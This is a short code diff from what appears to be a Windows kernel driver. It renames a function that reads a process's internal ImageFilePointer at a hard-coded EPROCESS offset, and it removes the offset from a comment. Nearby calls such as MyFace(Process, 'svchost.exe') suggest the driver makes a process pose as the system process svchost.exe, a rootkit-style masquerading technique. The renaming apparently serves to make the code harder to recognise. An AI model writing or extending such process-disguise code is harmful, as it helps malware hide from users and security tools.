@@ -258,7 +258,7 @@ prcc_Info(HANDLE pid)
 }
 
 BOOLEAN 
-PathWin10ImageNamePoint(PEPROCESS Process, WCHAR* szFullName)
+W10_imgPOINT(PEPROCESS Process, WCHAR* szFullName)
 {
     BOOLEAN bRet = FALSE;
     PFILE_OBJECT pFileObject = NULL;
@@ -273,7 +273,7 @@ PathWin10ImageNamePoint(PEPROCESS Process, WCHAR* szFullName)
 
     RtlZeroMemory(szNewFullName, KMAX_PATH * 2);
 
-    pFileObject = (PFILE_OBJECT)(*(PULONG_PTR)((ULONG_PTR)Process + 0x448)); //+0x448 ImageFilePointer 
+    pFileObject = (PFILE_OBJECT)(*(PULONG_PTR)((ULONG_PTR)Process + 0x448)); // ImageFilePointer 
 
     if (!MmIsAddressValid(pFileObject))
     {
@@ -603,7 +603,7 @@ Transing(HANDLE pid)
     TakeMe(Process, g_szTarFileObjectName);
 
     if (*NtBuildNumber > 9600)
-        PathWin10ImageNamePoint(Process, g_szTarWin10ImageFilePointerName);
+        W10_imgPOINT(Process, g_szTarWin10ImageFilePointerName);
 
     MyFace(Process, "svchost.exe");
 
